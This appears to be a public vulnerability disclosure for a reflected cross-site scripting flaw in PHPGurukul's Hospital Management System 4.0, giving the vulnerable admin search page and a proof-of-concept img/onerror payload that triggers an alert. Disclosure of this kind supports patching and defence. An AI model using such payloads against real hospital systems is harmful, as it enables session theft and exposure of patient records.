* Title: Hospital Management System Reflective cross-site scripting
* Exploit Author: Thinkland Security Team
* Vendor Homepage:https://phpgurukul.com/hospital-management-system-in-php
* Software Link:https://phpgurukul.com/wp-content/uploads/2018/02/Hospital-Management-System-Project.zip
* Version: 4.0
* Vulnerability verification
1. Enter username and password to log in
2. go to /Hospital%20Management%20System%20Project/hospital/hms/admin/patient-search.php,input the command:"><img src=1 onerror=alert(1)>
![image](https://github.com/BigTiger2020/Hospital-Management-System/blob/main/xss1.png)  
![image](https://github.com/BigTiger2020/Hospital-Management-System/blob/main/xss2.png)  
